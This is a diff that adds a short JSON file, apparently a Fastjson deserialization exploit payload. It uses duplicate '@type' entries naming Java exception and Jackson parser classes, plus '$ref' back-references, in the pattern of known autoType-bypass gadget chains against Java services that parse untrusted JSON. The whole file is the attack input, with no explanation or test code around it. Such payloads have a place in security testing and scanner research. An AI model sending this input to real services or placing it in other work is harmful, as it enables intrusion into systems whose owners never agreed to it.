@@ -1,0 +1,10 @@
+{
+"a": {    "@type": "java.lang.Exception",    "@type": "com.fasterxml.jackson.core.exc.InputCoercionException",    "p": {    }  },
+"b": {
+"$ref": "$.a.a"
+},
+"c": {  "@type": "com.fasterxml.jackson.core.JsonParser",  "@type": "com.fasterxml.jackson.core.json.UTF8StreamJsonParser",  "in": {}},
+"d": {
+"$ref": "$.c.c"
+}
+}
